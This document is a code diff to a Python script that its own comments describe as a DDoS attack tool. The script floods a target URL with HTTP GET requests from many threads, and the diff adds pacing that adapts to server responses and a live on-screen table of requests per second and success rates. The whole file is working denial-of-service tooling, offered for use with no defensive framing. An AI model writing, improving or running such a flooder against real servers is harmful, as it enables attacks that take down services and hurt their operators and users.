@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import requests
 import time
 import sys
@@ -5,6 +6,7 @@ import argparse
 import threading
 import logging
 from colorama import init, Fore, Style
+from datetime import datetime
 
 # Initialize colorama
 init(autoreset=True)
@@ -16,8 +18,13 @@ YELLOW = Fore.YELLOW
 BLUE = Fore.BLUE
 RESET = Style.RESET_ALL
 
-# Global variable to count requests sent
+# Global variables to count requests and success/error statistics
 requests_sent = 0
+successful_requests = 0
+failed_requests = 0
+rps = 0  # Requests per second
+last_time = time.time()
+
 requests_lock = threading.Lock()  # Lock for thread-safe requests counting
 
 # Function to display the banner with colors
@@ -35,49 +42,78 @@ def display_banner():
     """)
 
 # Function to send requests to the target URL
-def attack(target_url, stop_event, logger):
-    global requests_sent
+def attack(target_url, stop_event, pause_time):
+    global requests_sent, successful_requests, failed_requests
     while not stop_event.is_set():
         try:
-            # Send a GET request with a timeout
+            start_time = time.time()
             response = requests.get(target_url, timeout=3)
-            
-            # Check if server is reachable
+
+            # Calculate response time
+            response_time = time.time() - start_time
+
+            # Adaptive throttling based on server response time and failure rate
+            if response_time > 1.0:  # Adjust pause time if response time is too high
+                pause_time *= 1.1
+            elif response.status_code == 404 or response.status_code == 403:
+                failed_requests += 1
+                pause_time *= 1.2
+
             if response.status_code >= 500:
-                logger.error(f"Server error: {response.status_code}. Target may be down or overloaded.")
+                failed_requests += 1
                 print(f"{RED}Server error: {response.status_code}. Target may be down or overloaded.")
                 stop_event.set()
                 break
             elif response.status_code == 404:
-                logger.error(f"Server responded with 404: Not Found. The server may be unreachable.")
-                print(f"{RED}Server responded with 404: Not Found. The server may be unreachable.")
+                failed_requests += 1
+                print(f"{RED}404: Not Found. The server may be unreachable.")
                 stop_event.set()
                 break
             elif response.status_code == 403:
-                logger.error(f"Server responded with 403: Forbidden. The server has blocked the attack.")
-                print(f"{RED}Server responded with 403: Forbidden. The server has blocked the attack.")
+                failed_requests += 1
+                print(f"{RED}403: Forbidden. The server has blocked the attack.")
                 stop_event.set()
                 break
 
-            # Log each successful request
             with requests_lock:
                 requests_sent += 1
-            logger.info(f"Request {requests_sent} sent successfully.")
-            
+                successful_requests += 1
+
         except requests.RequestException as e:
-            logger.error(f"Error: Unable to reach the server. Details: {e}")
+            failed_requests += 1
             print(f"{RED}Error: Unable to reach the server. Details: {e}")
             stop_event.set()
             print(f"{YELLOW}The server appears to be down or unreachable!")
             break
 
-# Function to display the status of the attack with a colored output
-def display_status(stop_event, logger):
-    global requests_sent
+        time.sleep(pause_time)  # Pause to control request rate
+
+# Function to display the status of the attack with a color-coded table
+def display_status(stop_event):
+    global requests_sent, successful_requests, failed_requests, rps, last_time
     while not stop_event.is_set():
         with requests_lock:
-            print(f"{GREEN}Requests Sent: {requests_sent}", end="\r", flush=True)
-        logger.info(f"Requests Sent: {requests_sent}")
+            elapsed_time = time.time() - last_time
+            if elapsed_time > 1:
+                rps = requests_sent / elapsed_time
+                last_time = time.time()
+            success_rate = (successful_requests / requests_sent * 100) if requests_sent > 0 else 0
+            error_rate = (failed_requests / requests_sent * 100) if requests_sent > 0 else 0
+
+            # Clear the screen and print the table (it will refresh every second)
+            print(f"\033c", end="")  # ANSI escape sequence to clear the screen
+            print(f"{BLUE}Attack Progress:")
+            print(f"{GREEN}-----------------------------------------------")
+            print(f"{YELLOW}| {GREEN}Metric{YELLOW} | {GREEN}Value{RESET}     |")
+            print(f"{YELLOW}|------------------------------------|------------|")
+            print(f"{GREEN}| Requests Sent:             | {requests_sent:<18} |")
+            print(f"{GREEN}| Successful Requests: | {successful_requests:<18} |")
+            print(f"{RED}| Failed Requests:           | {failed_requests:<18} |")
+            print(f"{YELLOW}| RPS:                             | {rps:<18.2f} |")
+            print(f"{YELLOW}| Success Rate:      | {success_rate:.2f}%        |")
+            print(f"{RED}| Error Rate:             | {error_rate:.2f}%        |")
+            print(f"{GREEN}-----------------------------------------------")
+
         time.sleep(1)
 
 # Function to parse command-line arguments
@@ -107,8 +143,8 @@ def setup_logging(logfile, verbose):
 
 # Main function to run the DDoS attack
 def main():
-    global requests_sent
-    
+    global requests_sent, successful_requests, failed_requests, rps
+
     # Parse arguments
     target_url, num_threads, pause_time, logfile, verbose = parse_args()
 
@@ -121,21 +157,19 @@ def main():
 
     # Display the banner
     display_banner()
-    
-    logger.info(f"Starting DDoS attack on {target_url} with {num_threads} threads...")
 
     # Create a stop event to stop all threads gracefully
     stop_event = threading.Event()
 
     # Start the display status thread
-    status_thread = threading.Thread(target=display_status, args=(stop_event, logger))
+    status_thread = threading.Thread(target=display_status, args=(stop_event,))
     status_thread.daemon = True
     status_thread.start()
 
     # Start attack threads
     attack_threads = []
     for _ in range(num_threads):
-        t = threading.Thread(target=attack, args=(target_url, stop_event, logger))
+        t = threading.Thread(target=attack, args=(target_url, stop_event, pause_time))
         t.daemon = True
         attack_threads.append(t)
         t.start()
@@ -145,7 +179,6 @@ def main():
         while True:
             time.sleep(pause_time)
     except KeyboardInterrupt:
-        logger.warning(f"Attack interrupted by user.")
         print(f"\n{RED}Attack interrupted by user.")
         stop_event.set()
 
@@ -153,9 +186,8 @@ def main():
     for t in attack_threads:
         t.join()
 
-    # Print final results and log them
-    logger.info(f"Attack finished. Total requests sent: {requests_sent}")
+    # Print final results
     print(f"{GREEN}Attack finished. Total requests sent: {requests_sent}")
-
+    
 if __name__ == "__main__":
     main()
